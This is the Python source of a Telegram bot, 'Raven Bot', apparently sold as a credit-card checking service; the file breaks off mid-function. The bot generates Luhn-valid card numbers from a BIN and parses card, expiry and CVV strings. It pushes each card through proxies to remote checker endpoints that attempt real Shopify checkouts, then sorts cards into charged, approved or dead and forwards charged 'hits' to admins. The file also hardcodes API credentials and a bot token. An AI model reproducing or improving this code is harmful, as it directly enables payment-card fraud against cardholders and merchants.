from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta
import hashlib
import secrets
import sys
import math
from collections import Counter

# ==================== DIRECT API ENDPOINTS ====================
SHOPIFY_APIS = [
  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
  "http://chirag-x-shopify-production.up.railway.app/shopify",
  "http://chirag-x-shopify-production-6ead.up.railway.app/shopify",
  "http://chirag-x-shopify-production-e9ef.up.railway.app/shopify",
  "http://insaneee7xshopiify-production-38dc.up.railway.app/shopify",
  "https://new-one.up.railway.app/shopii",
]

# ==================== PREMIUM CUSTOM EMOJI IDS ====================
PREMIUM_EMOJI_IDS = {
    "💳": "5445353829304387411",
    "✅": "4956721670690702265", "❌": "4958526153955476488", "🔥": "4956499161319998529",
    "⚡": "4958479549265347295", "💠": "5343636681473935403",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5042290883949495533",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4956611513369494230", "💎": "4956719506027185156",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5897501460509234625",
    "🆓": "5406756500108501710", "👑": "6089003761496232797", "🔍": "5258396243666681152",
    "⏱": "5343927661213279013", "💥": "5122933683820430249", "🆔": "4958642964181025908",
    "👤": "5445174334031166029", "📅": "6014861794059752708", "🔄": "6267229004311303657",
    "🏦": "5332455502917949981", "🥰": "5224450179368767019", "😱": "5447181973544008180",
    "🔷": "5226656353744862682", "🔑": "5454386656628991407", "🗓": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "4958926882994127612",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "6089140105233044310",
    "🎉": "5172632227871196306", "🎁": "6025929752982852543", "🚫": "5116151848855667552",
    "🛒": "5312361253610475399", "🔧": "4904936030232117798", "😎": "6062275913725252016",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209", "💐": "5211171480519337811",
    "🛡": "5219672809936006424", "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "4956560549287560231", "🤓": "5422553316808730347",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "🌟": "5310224206732996002", "✳": "5040071927750722576", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "✴": "6321225560789877992", "😇": "5195033767969839232",
    "👌": "5445350109862720603", "❇": "5039727497143387500", "⭐": "5042176294222037888",
    "🍭": "6267152480878990865", "🤠": "5377396889652060561", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "0️⃣": "6053163053980063912", "❣️": "4956222745814762495",
    "1️⃣": "6052991826518873591", "🕛": "5787488119490088755", "🫠": "5472250091332993630",
    "🙃": "5377710125911924926", "🤩": "5039727497143387500", "🫡": "5226656353744862682",
    "🌸": "5823478592515871391", "😏": "4956461073550017373", "😙": "6237864166879663987",
    "🤟": "6267225207560214192", "🤑": "6089140105233044310", "🥳": "5767137507879685567",
    "😥": "5040042498634810056", "🥶": "5283232570660634549", "🌻": "6332197763417118285",
    "📩": "6154448909784585982", "😋": "4958642964181025908", "♻": "4956719506027185156",
    "🟠": "5825848340721438908", "🔴": "4956719506027185156", "🟢": "6235478849417647339",
    "🤪": "5332455502917949981", "🔶": "5123248930124989216", "🏅": "5780864206177834457",
    "🥇": "5769547529993588669", "🥈": "6156436440260549720", "🥉": "6235355429237430006",
    "🏆": "6235403472741603087", "🤭": "5825806005228803076", "😄": "5438571934210082705",
    "🧨": "5989927820984327321", "🌌": "5990181988558969463", "🧐": "5825779518165488504",
    "🕘": "5258113901106580375", "✨": "6298612102709909362", "⚡️": "5042334757040423886",
    "🎉": "6282977077427702833", "💀": "6206110936789423908", "🎁": "6066395745139824604",
    "🌟": "5267500801240092311", "🤖": "5039727497143387500", "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495", "🛑": "5420323339723881652", "🔙": "6285315214673975495",
    "🏠": "6282977077427702833",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        if emoji in result:
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ==================== BOT CONFIGURATION ====================
API_ID = 32143521
API_HASH = '273161fdfe0b9256e1baca74825672fb'
BOT_TOKEN = '9003076643:AAFdizhYHk1unaDPzdLDk-QsZ1OW0YGpiRk'

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
ADMIN_FILE = 'admin.txt'
KEYS_FILE = 'keys.txt'
STATS_FILE = 'stats.json'
START_VIDEO_FILE = 'start_video.txt'
GIFS_FILE = 'gifs.txt'

WORKER_COUNT = 150
PROGRESS_UPDATE_INTERVAL = 2.0
MAX_RETRIES = 15

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
http_session = None
_last_progress_update = {}
_last_progress_text = {}

def get_http_session():
    global http_session
    if http_session is None or http_session.closed:
        http_session = aiohttp.ClientSession()
    return http_session

# ==================== FILE OPERATIONS ====================
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def write_file_lines(filepath, lines):
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            for line in lines:
                f.write(f"{line}\n")
        return True
    except Exception as e:
        print(f"Error writing {filepath}: {e}")
        return False

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def load_banned_users(): return get_file_lines(BANNED_FILE)
def load_admins(): return get_file_lines(ADMIN_FILE)
def load_keys(): return get_file_lines(KEYS_FILE)
def load_start_video(): return get_file_lines(START_VIDEO_FILE)
def load_gifs(): return get_file_lines(GIFS_FILE)

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_checks": 0, "total_hits": 0, "users": {}}
    try:
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"total_checks": 0, "total_hits": 0, "users": {}}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2)
        return True
    except:
        return False

def is_premium(user_id): return str(user_id) in load_premium_users()
def is_banned(user_id): return str(user_id) in load_banned_users()
def is_admin(user_id): return str(user_id) in load_admins()

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'merchandise_expected_price_mismatch', 'payments_credit_card_generic',
    'payments_payment_flexibility_terms_id_mismatch', 'failed to get session token',
    'no valid payment method found', 'unable to get payment token',
    'cart failed with status 503', 'invalid json response', 'expecting value',
    'site not supported', 'no valid products', 'product price too high',
    'site requires login', 'proxy error', 'status: 4', 'site dead',
    'error processing card', 'generic_error', 'validation_custom',
    '429', 'rate limit', 'too many requests', '401', '403', '404', '<b>Proxy Dead!</b>', 'session token not found in HTML',
    'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT', 'NO_PRODUCT_FOUND',
    'Our minimum order is $15. Sticker fans: mix & match any 4+ designs, or grab the',
)

SITE_DEAD_TRIGGERS = [
    "request timeout", "timeout", "connection failed", "connection reset",
    "connection refused", "timed out", "site error", "site dead",
    "cloudflare", "cloudflare bypass failed", "captcha_required",
    "captcha required", "invalid url", "error in 1st req",
    "error in 1 req", "access denied", "tlsv1 alert", "ssl routines",
    "could not resolve", "domain name not found", "name or service not known",
    "openssl ssl_connect", "empty reply from server", "httperror504",
    "http error", "unreachable", "ssl error", "502", "503", "504",
    "bad gateway", "service unavailable", "gateway timeout",
    "network error", "failed to detect product", "failed to create checkout",
    "failed to tokenize card", "failed to get proposal data",
    "submit rejected", "submit rejected:", "handle error", "http 404",
    "delivery_delivery_line_detail_changed", "delivery_address2_required",
    "url rejected", "malformed input", "amount_too_small",
    "amount too small", "all products sold out", "no_session_token",
    "tokenize_fail", "merchandise_expected_price_mismatch",
    "payments_credit_card_generic", "error parsing submit",
    "payments_payment_flexibility_terms_id_mismatch",
    "failed to get session token", "no valid payment method found",
    "unable to get payment token", "cart failed with status 503",
    "invalid json response", "expecting value", "site not supported",
    "no valid products", "product price too high", "site requires login",
    "proxy error", "status: 4", "site dead", "error processing card",
    "generic_error", "validation_custom", "429", "rate limit",
    "too many requests", "401", "403", "404", "no valid", "<b>Proxy Dead!</b>", "session token not found in HTML", "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "NO_PRODUCT_FOUND",
    'Our minimum order is $15. Sticker fans: mix & match any 4+ designs, or grab the',
]

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

def generate_key():
    return secrets.token_hex(8).upper()

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10

def is_valid_card(card_number):
    if not card_number or len(card_number) < 13 or len(card_number) > 19:
        return False
    return luhn_checksum(card_number) == 0

def generate_cards(bin_number, count):
    cards = []
    bin_str = str(bin_number).strip()
    card_length = 16
    
    for _ in range(count):
        remaining_length = card_length - len(bin_str) - 1
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        card_without_checksum = bin_str + random_digits
        
        checksum = 0
        for i, digit in enumerate(reversed(card_without_checksum)):
            n = int(digit)
            if i % 2 == 0:
                n *= 2
                if n > 9:
                    n -= 9
            checksum += n
        
        checksum_digit = (10 - (checksum % 10)) % 10
        full_card = card_without_checksum + str(checksum_digit)
        
        year = random.randint(2026, 2030)
        month = random.randint(1, 12)
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        card_str = f"{full_card}|{month:02d}|{year}|{cvv}"
        cards.append(card_str)
    
    return cards

def is_card_expired(card):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return True
        month = int(parts[1])
        year = int(parts[2])
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if year < current_year or (year == current_year and month < current_month):
            return True
        return False
    except:
        return True

def clean_dead_cards(cards):
    valid_cards = []
    expired_count = 0
    invalid_count = 0
    
    for card in cards:
        parts = card.split('|')
        if len(parts) != 4:
            invalid_count += 1
            continue
        
        card_number = parts[0]
        
        if not is_valid_card(card_number):
            invalid_count += 1
            continue
        
        if is_card_expired(card):
            expired_count += 1
            continue
        
        valid_cards.append(card)
    
    return valid_cards, expired_count, invalid_count

async def get_random_gif():
    gifs = load_gifs()
    if gifs:
        return random.choice(gifs)
    return None

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def forward_charge_to_admin(card, result, user_id, username):
    try:
        admins = load_admins()
        if not admins:
            return
        
        gateway = result.get('gateway', 'Shopify Payments')
        price = result.get('price', '0.00')
        response_msg = result.get('message', 'Charged')
        
        message = f"""<b>🔥 NEW CHARGED HIT! 🔥</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💳 CC :</b> <code>{card}</code>
<b>💰 Price :</b> ${price}
<b>🔗 Gateway :</b> {gateway}
<b>💬 Result :</b> {response_msg[:100]}
<b>👤 User :</b> @{username} (<code>{user_id}</code>)
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🤖 Raven Bot | @Rowdyking07</b>"""

        for admin_id in admins:
            try:
                admin_msg = await bot.send_message(int(admin_id), premium_emoji(message), parse_mode='html')
                try:
                    await admin_msg.pin()
                except:
                    pass
            except:
                pass
    except Exception as e:
        print(f"Error forwarding charge to admin: {e}")

async def check_card(card, site, proxy):
    global API_FAIL_COUNT
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                'status': 'Site Error',
                'message': 'Invalid card format',
                'card': card,
                'site': site,
                'gateway': 'Unknown',
                'price': '-',
                'retry': True
            }

        if not site.startswith("http"):
            site = f"https://{site}"

        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response_msg = str(raw.get('Response', '')).strip()
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', raw.get('Gate', 'Shopify Mass'))
        status = raw.get('Status', '')
        api_status = raw.get('Status', False)

        response_lower = response_msg.lower()

        if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
            
            return {
                "status": "Site Error",
                "message": response_msg[:150] if response_msg else "Site Error",
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
                "site": site
            }

        async with API_FAIL_LOCK:
            if API_FAIL_COUNT > 0:
                API_FAIL_COUNT = 0

        is_rz = "razorpay" in gate.lower() or "rz" in gate.lower()
        if not is_rz:
            try:
                price_value = float(str(price).replace("$", "").replace("₹", "").strip())
                if price_value > 30:
                    return {
                        "status": "Site Error",
                        "message": f"Price ${price_value} > $30",
                        "card": card,
                        "retry": True,
                        "gateway": gate,
                        "price": price,
                        "site": site
                    }
            except:
                pass

        CHARGED_TRIGGERS = [
            "charged", "order completed", "order_placed", "order_paid",
            "thank you", "payment successful", "💎"
        ]
        
        if status == "Charged" or any(x in response_lower for x in CHARGED_TRIGGERS):
            return {
                'status': 'Charged',
                'message': response_msg[:150] if response_msg else "Charged",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        APPROVED_TRIGGERS = [
            'otp_required', 'approved', 'success', 'invalid_cvv',
            'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc',
            'incorrect cvc', 'incorrect_zip', 'incorrect zip',
            'insufficient_funds'
        ]
        
        if status == 'Approved' or any(x in response_lower for x in APPROVED_TRIGGERS):
            return {
                'status': 'Approved',
                'message': response_msg[:150] if response_msg else "Approved",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if "card_declined" in response_lower or "declined" in response_lower:
            return {
                'status': 'Dead',
                'message': response_msg[:150] if response_msg else "CARD_DECLINED",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if not api_status:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
            
            return {
                'status': 'Site Error',
                'message': response_msg[:150] if response_msg else "API Status False",
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        return {
            'status': 'Site Error',
            'message': response_msg[:150] if response_msg else "Unknown Error",
            'card': card,
            'retry': True,
            'gateway': gate,
            'price': price,
            'site': site
        }

    except asyncio.TimeoutError:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': 'Request timeout',
            'card': card,
            'retry': True,
            'gateway': 'Shopify Mass',
            'price': '-',
            'site': site
        }
    
    except json.JSONDecodeError as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': f'Invalid JSON: {str(e)[:50]}',
            'card': card,
            'retry': True,
            'gateway': 'Shopify Mass',
            'price': '-',
            'site': site
        }
    
    except Exception as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
        
        return {
            'status': 'Site Error',
            'message': f'Error: {str(e)[:80]}',
            'card': card,
            'retry': True,
            'gateway': 'Shopify Mass',
            'price': '-',
            'site': site
        }

API_FAIL_COUNT = 0
API_FAIL_LOCK = asyncio.Lock()

async def check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Shopify Mass', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Shopify Mass', 'price': '-', 'site': None}

    used_sites = set()
    used_proxies = set()

    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)
        
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            break
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        
        result = await check_card(card, site, proxy)
        result['site'] = site

        if not result.get('retry'):
            return result

        if attempt < max_retries - 2:
            await asyncio.sleep(0.3)

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Shopify Mass', 'price': '-', 'site': None}

async def update_progress(user_id, message_id, results, current_attempt_count, username="User"):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    if hours > 0:
        time_str = f"{hours}H {minutes}M {seconds}S"
    elif minutes > 0:
        time_str = f"{minutes}M {seconds}S"
    else:
        time_str = f"{seconds}S"

    display_name = f"@{username}" if username and not username.startswith("user_") else "Роуди Кинг [OFF FOR 1 MONTH]"
    
    total_hits = len(results['charged']) + len(results['approved'])

    progress_text = f"""Gate : Shopify Mass ⚙️
Status : {current_attempt_count}/{results['total']}
Live : {total_hits} ✅
Charged : {len(results['charged'])} 💎
Dead : {len(results['dead'])} ❌
Errors : {results.get('errors', 0)} ⚠️
Time : {time_str}
User : {display_name}
Dev : Raven"""

    buttons = [
        [Button.inline("🟢 Live", "view_live"), Button.inline("🗂️ All", "view_all")],
        [Button.inline("⏸️ Pause", "pause"), Button.inline("▶️ Resume", "resume")],
        [Button.inline("🛑 Stop", "stop")]
    ]

    key = f"{user_id}_{message_id}"
    current_time = time.time()
    formatted_text = premium_emoji(progress_text)
    
    if key in _last_progress_update:
        time_diff = current_time - _last_progress_update[key]
        if time_diff < PROGRESS_UPDATE_INTERVAL and key in _last_progress_text and _last_progress_text[key] == formatted_text:
            return

    try:
        await bot.edit_message(user_id, message_id, formatted_text, buttons=buttons, parse_mode='html')
        _last_progress_update[key] = current_time
        _last_progress_text[key] = formatted_text
    except Exception as e:
        error_str = str(e).lower()
        if "not modified" in error_str:
            pass
        elif "wait" in error_str:
            try:
                wait_match = re.search(r'wait of (\d+) seconds', error_str)
                if wait_match:
                    wait_time = int(wait_match.group(1)) + 1
                    await asyncio.sleep(min(wait_time, 3))
                    try:
                        await bot.edit_message(user_id, message_id, formatted_text, buttons=buttons, parse_mode='html')
                        _last_progress_update[key] = time.time()
                        _last_progress_text[key] = formatted_text
                    except:
                        pass
            except:
                pass
        else:
            print(f"Error updating progress: {e}")

async def send_start_video_and_welcome(user_id, username, page="home"):
    start_videos = load_start_video()
    
    stats = load_stats()
    if 'users' not in stats:
        stats['users'] = {}
    user_stats = stats['users'].get(str(user_id), {})
    
    joined_date = user_stats.get('joined', "08.10.2026")
    credits_count = user_stats.get('credits', 797)
    
    if is_admin(user_id):
        plan = "🛡️ Admin"
    elif is_premium(user_id):
        plan = "⭐ Premium"
    else:
        plan = "Trial"
    
    display_name = f"@{username}" if username and not username.startswith("user_") else "Роуди Кинг [OFF FOR 1 MONTH]"

    welcome_text = f"""<b>[+] Hey, Welcome to Raven Bot ✅</b>

<b>• User :</b> {display_name}
<b>• User ID :</b> <code>{user_id}</code>
<b>• Access :</b> {plan}
<b>• Credits :</b> {credits_count}
<b>• Joined :</b> {joined_date}

<b>⌘ Choose an option below.</b>
<b>──────────────</b>
<b>• Dev :</b> Raven
<b>• Build :</b> 1.1"""

    main_buttons = [
        [
            Button.inline("Checker", "show_cmds"),
            Button.inline("Buy Now", "owner_redirect"),
        ],
        [
            Button.inline("Updates ↗", data=b"updates_redirect"),
            Button.inline("Support", b"support_menu"),
        ],
        [
            Button.inline("❌ Close", "close_menu"),
        ]
    ]

    try:
        if start_videos:
            video_url = random.choice(start_videos)
            await bot.send_file(user_id, video_url, caption=premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
        else:
            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
    except Exception as e:
        print(f"Error sending start video: {e}")
        try:
            await bot.send_message(user_id, premium_emoji(welcome_text), buttons=main_buttons, parse_mode='html')
        except:
            clean_text = re.sub(r'<[^>]+>', '', welcome_text)
            await bot.send_message(user_id, clean_text, buttons=main_buttons)

async def send_result_with_gif(user_id, message, gif=None):
    if not gif:
        gif = await get_random_gif()
    try:
        if gif:
            sent_msg = await bot.send_file(user_id, gif, caption=premium_emoji(message), parse_mode='html')
        else:
            sent_msg = await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        return sent_msg
    except Exception as e:
        print(f"Error sending result: {e}")
        try:
            sent_msg = await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
            return sent_msg
        except:
            return None

async def send_otp_result(user_id, result, username):
    full_card = result['card']
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(full_card.split('|')[0])
    except:
        brand, bin_type, level, bank, country, flag = 'MASTERCARD', 'CREDIT', '-', 'BANCO', 'DOMINICAN REPUBLIC', '🇩🇴'
    
    response_msg = result.get('message', 'OTP_REQUIRED')
    display_name = f"@{username}" if username and not username.startswith("user_") else "Роуди Кинг [OFF FOR 1 MONTH]"
    price = result.get('price', '1')

    message = f"""Card : <code>{full_card}</code>

Gate : Shopify [{price} USD]
Raw : {response_msg}
Status : OTP_REQUIRED ⚠️

Bank : {bank}
Type : {brand} [ {bin_type} ]
Country : {flag} {country}

User : {display_name}
Dev : Raven / Proxy : Live 🟢"""
    await send_result_with_gif(user_id, message)

async def send_animated_result(user_id, result, hit_type, username, is_premium_user=True):
    full_card = result['card']
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(full_card.split('|')[0])
    except:
        brand, bin_type, level, bank, country, flag = 'MASTERCARD', 'CREDIT', '-', 'BANCO', 'DOMINICAN REPUBLIC', '🇩🇴'
    
    response_msg = result.get('message', 'ORDER_PAID')
    display_name = f"@{username}" if username and not username.startswith("user_") else "Роуди Кинг [OFF FOR 1 MONTH]"
    price = result.get('price', '1')
    
    if hit_type == "Charged":
        status_line = "Charged 💎"
    else:
        status_line = "Approved ✅"

    message = f"""Card : <code>{full_card}</code>

Gate : Shopify [{price} USD]
Raw : {response_msg}
Status : {status_line}

Bank : {bank}
Type : {brand} [ {bin_type} ]
Country : {flag} {country}

User : {display_name}
Dev : Raven / Proxy : Live 🟢"""

    sent_msg = await send_result_with_gif(user_id, message)
    if hit_type == "Charged" and sent_msg:
        try:
            await sent_msg.pin()
        except Exception as e:
            print(f"Error pinning charged message: {e}")

async def send_dead_result(user_id, result, username):
    pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    if hours > 0:
        time_str = f"{hours}H {minutes}M {seconds}S"
    elif minutes > 0:
        time_str = f"{minutes}M {seconds}S"
    else:
        time_str = f"{seconds}S"

    display_name = "Роуди Кинг [OFF FOR 1 MONTH]"
    total_hits = len(results['charged']) + len(results['approved'])
    error_count = results.get('errors', 0)
    
    summary = f"""Gate : Shopify Mass ⚙️
Status : {results['total']}/{results['total']}
Live : {total_hits} ✅
Charged : {len(results['charged'])} 💎
Dead : {len(results['dead'])} ❌
Errors : {error_count} ⚠️
Time : {time_str}
User : {display_name}
Dev : Raven

Check Complete. ✅"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"raven_chk_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("✦ Raven Bot Results ✦\n\n")
        if results['charged']:
            for r in results['charged']:
                f.write(f"CHARGED: {r['card']} | {r.get('message', '')}\n")
        if results['approved']:
            for r in results['approved']:
                f.write(f"APPROVED: {r['card']} | {r.get('message', '')}\n")

    buttons = [
        [Button.inline("🟢 Live", "view_live"), Button.inline("🗂️ All", "view_all")],
        [Button.inline("➕ Top Up", "top_up"), Button.inline("📊 Stats", "user_stats")]
    ]

    try:
        await bot.send_message(user_id, premium_emoji(summary), buttons=buttons, parse_mode='html')
    except Exception as e:
        print(f"Error sending final results: {e}")

# ==================== COMMANDS & CALLBACKS ====================

@bot.on(events.CallbackQuery(pattern="close_menu"))
async def close_menu_handler(event):
    try:
        await event.delete()
    except:
        try:
            await event.edit("<b>Session closed. Send /start to open again.</b>", parse_mode='html')
        except:
            pass

@bot.on(events.CallbackQuery(pattern="updates_redirect"))
async def updates_redirect_handler(event):
    try:
        await event.answer("📢 Channel Link: https://t.me/+I_2VKfDzJKIyOTQ1", alert=True)
    except:
        pass

@bot.on(events.CallbackQuery(pattern="show_cmds"))
async def show_cmds_callback(event):
    try:
        await event.answer("📋 Showing Commands", alert=True)
    except:
        pass
    
    cmds_text = f"""<b>📋 Raven Bot Commands</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<code>/cc card|mm|yy|cvv  - Check single CC</code>
<code>/chk                 - Reply to .txt file</code>
<code>/gen [BIN] [count]   - Generate CCs</code>
<code>/bin [BIN]           - BIN Lookup</code>
<code>/clean               - Clean CC file</code>
<code>/split [lines]       - Split file</code>
<code>/merge               - Merge files</code>
<code>/validate            - Validate cards</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""
    
    try:
        await event.edit(premium_emoji(cmds_text), buttons=[Button.inline("🔙 Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in show_cmds_callback: {e}")

@bot.on(events.CallbackQuery(pattern="owner_redirect"))
async def owner_redirect_callback(event):
    try:
        await event.answer("👤 Owner: @Rowdyking07", alert=True)
    except:
        pass
    
    owner_text = f"""<b>👤 Owner Info</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Owner:</b> @Rowdyking07
<b>Dev:</b> Raven
<b>Channel:</b> t.me/Rowdyking07
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""
    
    try:
        await event.edit(premium_emoji(owner_text), buttons=[Button.inline("🔙 Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in owner_redirect_callback: {e}")

@bot.on(events.CallbackQuery(pattern="user_stats"))
async def user_stats_callback(event):
    try:
        await event.answer("📊 Stats", alert=True)
    except:
        pass
    
    user_id = event.sender_id
    stats = load_stats()
    user_data = stats.get('users', {}).get(str(user_id), {})
    
    message = f"""<b>📊 Your Stats</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>User ID :</b> <code>{user_id}</code>
<b>Checks :</b> {user_data.get('checks', 0)}
<b>Hits :</b> {user_data.get('hits', 0)}
<b>Access :</b> Trial
<b>━━━━━━━━━━━━━━━━━━━━━━</b>"""
    
    try:
        await event.edit(premium_emoji(message), buttons=[Button.inline("🔙 Back", "home")], parse_mode='html')
    except Exception as e:
        print(f"Error in user_stats_callback: {e}")

@bot.on(events.CallbackQuery(pattern="top_up"))
async def top_up_callback(event):
    try:
        await event.answer("➕ Contact @Rowdyking07 to Top Up Credits", alert=True)
    except:
        pass

@bot.on(events.CallbackQuery(pattern="home"))
async def home_callback(event):
    try:
        await event.answer("🏠 Home", alert=True)
    except:
        pass
    
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    try:
